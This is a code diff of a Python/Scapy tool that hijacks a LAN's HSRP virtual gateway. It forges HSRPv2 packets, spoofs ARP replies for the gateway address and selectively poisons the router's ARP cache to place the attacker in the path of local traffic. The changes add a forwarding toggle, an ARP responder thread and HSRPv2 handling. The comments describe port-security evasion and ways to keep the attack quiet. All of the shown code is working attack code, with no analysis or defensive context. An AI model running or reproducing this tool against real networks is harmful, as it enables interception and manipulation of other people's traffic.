@@ -10,20 +10,30 @@ import random
 # [OPTIONS]
 # change as necessary
 interface = "eth0"
+
 # Default false. option to poison router if sniffing of response is required, makes attack more noisy, mutually exclusive with translateip
 # can be toggled at runtime by typing "poison"
 poisonrouter = False
+
 # Default true. only poison for packets of interest, when poisonrouter set to True
 # see start_selective_poisoning() for rules
 silentmode = True
+
 # Default true. option to force use of own mac address only when sending hsrp and arp packets
 attackportsecurity = True
+
 # Default False. perform nat translation for all received packets before forwarding to router. poisonrouter should be set to False when translateip set to True
 translateip = False
+
+# Default True. forwards received packets to their intended destination.
+forwardpackets = True
+
 # print more info to stdout at runtime. Toggleable at runtime by typing "debug"
 debug = False
+
 # exit when detected failed attack
 terminateonfail = False
+
 # for testing only, to set to false when running attack
 usepcapfile = False
 spoison = False
@@ -108,10 +118,18 @@ def check_hsrp(packet):
         ethersrc = packet[Ether].src
         # TODO to improve on HSRPv2 detection, currently based on source mac address only and fails if standby group number changes
         if ethersrc == "00:00:0c:9f:f0:01":
+            if attackstarted:
+                srcip = packet[IP].src
+                if srcip != myip:
+                    hsrpfound = True
+                return
             print("HSRPv2 found")
             version = 2
             hsrpfound = True
             pkcopy = packet
+            ###################
+            #pkcopy[HSRP].virtualIP = "192.168.50.1"
+            #pkcopy[IP].src = "192.168.50.1"
 
 # make sure hsrp packet is valid
 def check_v1_fields(packet):
@@ -178,7 +196,7 @@ def send_hsrp(packet):
         payloadText = b'cisco\x00\x00\x00'
         ###################################
         eth = Ether(src=ethersrc, dst=etherdst)
-        ip = IP(src=attackerIP, dst=destIP, len=80, ttl=ipttl)
+        ip = IP(src=myip, dst="224.0.0.102", len=80, ttl=ipttl)
         udp = UDP(sport=sport, dport=dport, len=60)
         groupTlv = IPv6ExtHdrSegmentRoutingTLV(type=1, len=40, value=payloadHSRP)
         textTlv = IPv6ExtHdrSegmentRoutingTLV(type=3, len=8, value=payloadText)
@@ -189,7 +207,11 @@ def send_hsrp(packet):
         send_initial_arp(packet)
         sendp(pkt, verbose=False)
         send_initial_arp(packet)
-        sendp(pkt, iface=interface, inter=3, loop=1)
+        arp_thread = threading.Thread(target=start_arp_responder, args=(pkcopy), daemon=True)
+        arp_thread.start()
+        selective_poison = threading.Thread(target=start_selective_poisoning, args=(pkcopy), daemon=True)
+        selective_poison.start()
+        sendp(pkt, iface=interface, inter=3, loop=1, verbose=False)
 
 # Send arp with HSRP virtual ip to redirect local traffic to attacker
 def send_initial_arp(packet):
@@ -242,7 +264,7 @@ def start_selective_poisoning(packet):
     '''Start poisoning router's arp cache, but only when hosts are sending packets
     
     Packets will be broadcast to look like a request for the virtual gateway ip'''
-    if debug:
+    if debug and poisonrouter:
         print("[DEBUG] Poisoning router to get return packets")
     routerIP = packet[IP].src
     # selectively poison when detecting exploitable packet
@@ -447,7 +469,8 @@ def user_input_handler():
 
 def setup():
     '''Runs commands to configure linux for attack'''
-    enable_forwarding()
+    if forwardpackets:
+        enable_forwarding()
     if translateip:
         enable_translation()
     if not nosubinter:
@@ -484,20 +507,19 @@ if __name__ == "__main__":
             Use pcap file: {usepcapfile}\n\
             Terminate on fail: {terminateonfail}")
         if find_hsrp():
-            if version == 1:
-                setup()
-                print(f"Attacking on this interface: {interface} {myip} {mymac}")
-                '''if translateip:
-                    forwarding = threading.Thread(target=start_forward_sniffer, daemon=True)
-                    forwarding.start()'''
-                if spoison:
-                    poison = threading.Thread(target=simple_poison, args=(5,), daemon=True)
-                    poison.start()
-                fail_check = threading.Thread(target=delayed_failure_check, daemon=True)
-                fail_check.start()
-                attack_hsrp = threading.Thread(target=send_hsrp, args=(pkcopy), daemon=True)
-                attack_hsrp.start()
-                user_input_handler()
+            setup()
+            print(f"Attacking on this interface: {interface} {myip} {mymac}")
+            '''if translateip:
+                forwarding = threading.Thread(target=start_forward_sniffer, daemon=True)
+                forwarding.start()'''
+            if spoison:
+                poison = threading.Thread(target=simple_poison, args=(5,), daemon=True)
+                poison.start()
+            fail_check = threading.Thread(target=delayed_failure_check, daemon=True)
+            fail_check.start()
+            attack_hsrp = threading.Thread(target=send_hsrp, args=(pkcopy), daemon=True)
+            attack_hsrp.start()
+            user_input_handler()
     except KeyboardInterrupt:
         print("\nUser interrupt, exiting...\n")
         cleanup()
